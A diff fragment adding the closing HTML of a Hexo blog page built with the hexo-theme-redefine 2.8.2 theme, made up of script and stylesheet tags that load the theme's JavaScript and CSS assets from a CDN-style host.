+    <script type="module" src="https://evan.beee.top/projects/hexo-theme-redefine@2.8.2/source/js/build/tools/codeBlock.js" ></script>
+
+
+
+    <script type="module" src="https://evan.beee.top/projects/hexo-theme-redefine@2.8.2/source/js/build/layouts/lazyload.js" ></script>
+
+
+
+    <script  src="https://evan.beee.top/projects/hexo-theme-redefine@2.8.2/source/js/build/tools/runtime.js" ></script>
+    <script  src="https://evan.beee.top/projects/hexo-theme-redefine@2.8.2/source/js/build/libs/odometer.min.js" ></script>
+    <link rel="stylesheet" href="https://evan.beee.top/projects/hexo-theme-redefine@2.8.2/source/assets/odometer-theme-minimal.css">
+
+
+
+  <script  src="https://evan.beee.top/projects/hexo-theme-redefine@2.8.2/source/js/build/libs/Typed.min.js" ></script>
+  <script type="module" src="https://evan.beee.top/projects/hexo-theme-redefine@2.8.2/source/js/build/plugins/typed.js" ></script>
+
+
+
+
+
+    <script  src="https://evan.beee.top/projects/hexo-theme-redefine@2.8.2/source/js/build/libs/minimasonry.min.js" ></script>
+    <script type="module" src="https://evan.beee.top/projects/hexo-theme-redefine@2.8.2/source/js/build/plugins/masonry.js" ></script>
+
+
+
+
+
+
+    <script type="module" src="https://evan.beee.top/projects/hexo-theme-redefine@2.8.2/source/js/build/tools/tocToggle.js" data-swup-reload-script></script><script type="module" src="https://evan.beee.top/projects/hexo-theme-redefine@2.8.2/source/js/build/layouts/toc.js" data-swup-reload-script></script><script type="module" src="https://evan.beee.top/projects/hexo-theme-redefine@2.8.2/source/js/build/plugins/tabs.js" data-swup-reload-script></script>
+
+
+<script  src="https://evan.beee.top/projects/hexo-theme-redefine@2.8.2/source/js/build/libs/moment-with-locales.min.js" data-swup-reload-script></script>
+<script type="module" src="https://evan.beee.top/projects/hexo-theme-redefine@2.8.2/source/js/build/layouts/essays.js" data-swup-reload-script></script>
+
+
+    <script  src="https://evan.beee.top/projects/hexo-theme-redefine@2.8.2/source/js/build/libs/pangu.min.js" ></script><script  src="https://evan.beee.top/projects/hexo-theme-redefine@2.8.2/source/js/build/plugins/pangu.js" ></script>
+
+
+
+    <script type="module" src="https://evan.beee.top/projects/hexo-theme-redefine@2.8.2/source/js/build/layouts/bookmarkNav.js" ></script>
+
+	
+</body>
+
+</html>
